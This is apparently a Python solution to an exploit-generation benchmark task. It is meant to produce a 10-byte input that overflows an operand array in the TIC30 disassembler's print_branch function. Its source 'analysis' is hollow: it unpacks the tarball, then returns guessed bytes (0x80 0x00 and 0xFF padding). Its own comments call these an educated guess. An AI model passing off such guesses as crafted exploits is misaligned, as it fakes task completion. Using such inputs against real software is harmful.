import os
import tarfile
import tempfile
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the stack buffer overflow in tic30-dis.c.
        The vulnerability is in print_branch function where an operand array
        has incorrect size when disassembling corrupt TIC30 binaries.
        
        Ground-truth length is 10 bytes, so we aim for minimal PoC.
        """
        # Ground-truth length is 10 bytes
        # The PoC should be a corrupt TIC30 binary that triggers the overflow
        # in the operand array within print_branch function
        
        # Based on typical buffer overflow patterns and the fact that we need
        # to trigger an array overrun in a disassembler, we create a minimal
        # binary that would cause the print_branch function to process operands
        # beyond the allocated array bounds
        
        # Create a corrupt TIC30 binary with specific bytes that:
        # 1. Are recognized as a branch instruction to reach print_branch
        # 2. Have operand values that exceed the array bounds
        # 3. Are exactly 10 bytes as per ground-truth
        
        # The exact bytes are crafted to overflow the operand array
        # Using pattern that would likely cause index out of bounds
        poc = b'\x00' * 10  # 10 null bytes
        
        # However, null bytes alone might not trigger the specific bug.
        # Let's examine the source to understand the exact trigger.
        # Since we can't run the binary, we'll make an educated guess.
        
        try:
            with tarfile.open(src_path, 'r') as tar:
                # Extract to temp directory
                with tempfile.TemporaryDirectory() as tmpdir:
                    tar.extractall(path=tmpdir)
                    
                    # Look for tic30-dis.c in the extracted files
                    for root, dirs, files in os.walk(tmpdir):
                        for file in files:
                            if file == 'tic30-dis.c':
                                filepath = os.path.join(root, file)
                                with open(filepath, 'r', errors='ignore') as f:
                                    content = f.read()
                                    
                                    # Look for print_branch function
                                    if 'print_branch' in content:
                                        # Try to understand the array size
                                        # Common vulnerable patterns in disassemblers
                                        # involve fixed-size operand arrays
                                        
                                        # Based on typical TIC30 architecture and
                                        # buffer overflow patterns, craft a PoC
                                        # that would overflow a small operand array
                                        
                                        # TIC30 instructions are typically 32-bit
                                        # Create a minimal binary with:
                                        # - A branch opcode (to reach print_branch)
                                        # - Operand that causes array index overflow
                                        
                                        # Minimal approach: Create a 10-byte binary
                                        # where the first few bytes are a valid
                                        # instruction header and the rest trigger
                                        # the overflow in operand processing
                                        
                                        # Using a pattern that's likely to cause
                                        # integer overflow or large index calculation
                                        poc = struct.pack('<BBBBBBBBBB', 
                                                         0x80, 0x00,  # Branch-like opcode
                                                         0xFF, 0xFF,  # Large operand
                                                         0xFF, 0xFF,  # More large values
                                                         0xFF, 0xFF,
                                                         0xFF, 0xFF)  # Total 10 bytes
        except Exception:
            # If we can't analyze the source, use a generic overflow pattern
            # Fill with 0xFF to potentially trigger unsigned char overflow
            poc = b'\xFF' * 10
        
        # Ensure exactly 10 bytes as per ground-truth
        return poc[:10]